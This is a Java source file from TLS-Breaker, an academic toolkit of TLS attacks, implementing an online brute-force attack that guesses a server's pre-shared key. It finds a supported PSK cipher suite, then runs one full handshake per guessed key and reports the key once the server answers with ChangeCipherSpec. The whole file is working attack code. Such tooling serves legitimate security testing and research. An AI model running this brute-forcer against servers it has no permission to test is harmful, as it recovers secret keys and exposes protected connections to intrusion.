/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.serverpskbruteforce.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import java.util.List;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceivingAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsbreaker.breakercommons.attacker.Attacker;
import de.rub.nds.tlsbreaker.breakercommons.attacker.VulnerabilityType;
import de.rub.nds.tlsbreaker.breakercommons.psk.guessprovider.GuessProvider;
import de.rub.nds.tlsbreaker.breakercommons.psk.guessprovider.GuessProviderFactory;
import de.rub.nds.tlsbreaker.serverpskbruteforce.config.PskBruteForcerAttackServerCommandConfig;

/**
 *
 */
public class PskBruteForcerAttackServer extends Attacker<PskBruteForcerAttackServerCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private GuessProvider guessProvider;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public PskBruteForcerAttackServer(PskBruteForcerAttackServerCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    public void executeAttack() {
        CONSOLE.info("Connecting to the Server to find a PSK cipher suite he supports...");
        CipherSuite suite = getSupportedPskCipherSuite();
        if (suite == null) {
            CONSOLE.warn("Did not find a supported PSK ciphersuite; Stopping attack");
            return;
        }

        CONSOLE.info(
                "The server supports {}. Trying to guess the PSK. This is an online Attack. Depending on the PSK this may take some time...",
                suite);
        guessProvider = GuessProviderFactory.createGuessProvider(config.getGuessProviderType(),
                config.getGuessProviderInputStream());
        boolean result = false;
        int counter = 0;
        long startTime = System.currentTimeMillis();
        while (!result && guessProvider.hasNext()) {
            byte[] guessedPsk = guessProvider.next();
            if (guessedPsk.length == 0) {
                continue;
            }
            counter++;
            LOGGER.debug("Guessing: {}", ArrayConverter.bytesToHexString(guessedPsk));
            result = executeProtocolFlowToServer(suite, guessedPsk);
            if (result) {
                long duration = System.currentTimeMillis() - startTime;
                long totalSeconds = duration / 1000;
                CONSOLE.info("Found the psk in {} min {} sec", totalSeconds / 60, totalSeconds % 60);
                CONSOLE.info("Guessed {} times", counter);
            }
        }
    }

    @Override
    public VulnerabilityType isVulnerable() {
        CONSOLE.info("Connecting to the Server...");
        boolean supportsPsk = getSupportedPskCipherSuite() != null;
        if (supportsPsk) {
            CONSOLE.info("Server supports PSK");
            return VulnerabilityType.VULNERABILITY_POSSIBLE;
        } else {
            CONSOLE.info("Not Vulnerable - server does not support PSK");
            return VulnerabilityType.NOT_VULNERABLE;
        }
    }

    private CipherSuite getSupportedPskCipherSuite() {
        Config tlsConfig = getTlsConfig();

        String clientIdentity = config.getPskIdentity();
        LOGGER.debug("Client Identity: {}", clientIdentity);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor executor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(),
                state);
        executor.executeWorkflow();
        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
            return state.getTlsContext().getSelectedCipherSuite();
        } else {
            CONSOLE.info(
                    "Did not receive a ServerHello. The Server does not seem to support any of the tested PSK cipher suites.");
            if (LOGGER.isDebugEnabled()) {
                LOGGER.debug("We tested for the following cipher suites:");
                for (CipherSuite suite : tlsConfig.getDefaultClientSupportedCipherSuites()) {
                    LOGGER.debug(suite.name());
                }
            }
            return null;
        }
    }

    private boolean executeProtocolFlowToServer(CipherSuite suite, byte[] pskGuess) {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setDefaultClientSupportedCipherSuites(suite);
        tlsConfig.setDefaultSelectedCipherSuite(suite);
        tlsConfig.setDefaultPSKKey(pskGuess);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
                .createWorkflowTrace(WorkflowTraceType.HANDSHAKE, RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory
                .createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        List<ReceivingAction> val = state.getWorkflowTrace().getReceivingActions();
        if (val.get(1).getReceivedMessages().get(0).toString().contains("ChangeCipherSpecMessage:")) {
            CONSOLE.info("PSK {}", ArrayConverter.bytesToHexString(pskGuess));
            return true;
        } else {
            return false;
        }
    }
}
